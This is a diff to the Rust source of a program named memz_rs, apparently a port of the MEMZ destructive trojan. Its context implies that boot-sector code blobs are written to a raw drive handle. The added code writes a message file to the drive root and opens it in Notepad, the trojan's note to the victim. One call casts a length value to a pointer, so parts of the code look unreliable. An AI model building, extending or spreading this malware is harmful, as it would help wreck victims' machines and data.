@@ -3,6 +3,7 @@
 use memz_rs::{
     convert_str::ToPCSTRWrapper,
     data::{
+        self,
         code::{CODE1, CODE1_LEN, CODE2, CODE2_LEN},
         msg::MSGS,
     },
@@ -22,17 +23,18 @@ use std::{
     thread::{self, sleep},
     time::Duration,
 };
-use windows::Win32::{
+use windows::{Win32::{
     Foundation::{
         GetLastError, GENERIC_READ, GENERIC_WRITE, HANDLE, HMODULE, HWND, LPARAM, LRESULT,
         NTSTATUS, WPARAM,
     },
     Graphics::Gdi::HFONT,
     Storage::FileSystem::{
-        WriteFile, FILE_FLAGS_AND_ATTRIBUTES, FILE_SHARE_READ, FILE_SHARE_WRITE, OPEN_EXISTING,
+        WriteFile, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, FILE_FLAGS_AND_ATTRIBUTES,
+        FILE_SHARE_READ, FILE_SHARE_WRITE, OPEN_EXISTING,
     },
-    UI::WindowsAndMessaging::{MB_ICONHAND, MB_OK, MB_SYSTEMMODAL, WH_CBT},
-};
+    UI::WindowsAndMessaging::{MB_ICONHAND, MB_OK, MB_SYSTEMMODAL, WH_CBT, SW_SHOWDEFAULT},
+}, core::PCSTR};
 
 struct Clean {
     main_window: HWND,
@@ -149,6 +151,53 @@ fn main() -> Result<(), WinError> {
     }
 
     wrap_close_handle(drive)?;
+
+    let note = wrap_create_file_a(
+        "\\note.txt",
+        GENERIC_READ | GENERIC_WRITE,
+        FILE_SHARE_READ | FILE_SHARE_WRITE,
+        None,
+        CREATE_ALWAYS,
+        FILE_ATTRIBUTE_NORMAL,
+        HANDLE::default(),
+    )
+    .unwrap();
+
+    if !unsafe {
+        WriteFile(
+            note,
+            Some(data::msg::MSG.as_bytes()),
+            Some(data::msg::MSG_LEN as *mut u32),
+            None,
+        )
+        .as_bool()
+    } {
+        #[cfg(not(feature = "DEBUG_MODE"))]
+        eprintln!("Failed WriteFile()\nGetLastError: {:?}", unsafe {
+            GetLastError()
+        });
+
+        #[cfg(feature = "DEBUG_MODE")]
+        write_log(
+            LogType::ERROR,
+            LogLocation::ALL,
+            &format!("Failed CreateFileA()\nGetLastError: {:?}", unsafe {
+                GetLastError()
+            }),
+        );
+        return Err(WinError::Failed);
+    }
+
+    wrap_close_handle(note)?;
+
+    wrap_shell_execute_a(
+        HWND::default(),
+        PCSTR::null(),
+        "notepad",
+        "\\note.txt",
+        PCSTR::null(),
+        SW_SHOWDEFAULT,
+    )?;
 
     Ok(())
 }
